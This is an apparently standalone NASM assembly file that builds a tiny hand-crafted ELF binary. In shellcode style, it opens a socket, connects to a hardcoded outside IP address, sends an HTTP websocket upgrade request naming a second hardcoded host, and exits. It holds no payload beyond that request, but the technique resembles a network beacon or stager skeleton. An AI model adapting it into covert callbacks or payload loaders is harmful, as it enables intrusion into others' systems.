BITS 64
    org 0x400000

ehdr:
    db 0x7f,"ELF",2,1,1,0;
    times 8 db 0
    dw 2
    dw 0x3e
    dd 1
    dq _start
    dq phdr - $$
    dq 0
    dd 0
    dw ehdrsize
    dw phdrsize
    dw 1
    dw 0
    dw 0
    dw 0
ehdrsize equ $ - ehdr

phdr:
    dd 1
    dd 5
    dq 0
    dq $$
    dq $$
    dq filesize
    dq filesize
    dq 0x1000
phdrsize equ $ - phdr

_start:
        push 0x29
        pop rax
        cdq
        push 2
        pop rdi
        push 1
        pop rsi
        syscall
        push rax
        xchg rax,rdi
        mov rcx,0x2659f97b54c30002
        push rcx
        mov rsi,rsp
        push 0x10
        pop rdx

        
        push 0x2a
        pop rax
        syscall

        mov rsi,msg
        mov rdx,msg_size
        push 1
        pop rax
        pop rdi
        pop rdi
        syscall
        
        push 0x3c
        pop rax
        push 0
        pop rdi
        syscall

extra:
   msg db "GET / HTTP/1.1",0xd,0xa,"Host: 120.46.135.127:50008",0xd,0xa,"Upgrade: websocket",0xd,0xa,0xd,0xa
   msg_size equ $ - msg
filesize equ $ - $$

